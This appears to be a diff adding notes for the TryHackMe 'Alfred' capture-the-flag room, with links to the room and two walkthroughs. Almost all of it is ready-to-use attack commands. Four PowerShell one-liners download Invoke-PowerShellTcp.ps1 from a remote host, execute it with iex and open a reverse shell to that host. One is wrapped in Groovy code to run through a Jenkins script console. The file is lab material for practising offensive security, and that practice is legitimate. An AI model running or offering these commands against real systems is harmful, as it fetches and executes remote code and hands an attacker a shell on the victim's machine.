@@ -1,0 +1,12 @@
+print "powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.88.227:8000/Invoke-PowershellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.88.227 -Port 1234".execute().text
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.88.227:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.88.227 -Port 1234
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.88.227:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.88.227 -Port 9000
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.88.227:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.88.227 -Port 1234
+
+
+https://tryhackme.com/room/alfred
+https://steflan-security.com/tryhackme-alfred-walkthrough/
+https://www.aldeid.com/wiki/TryHackMe-Alfred
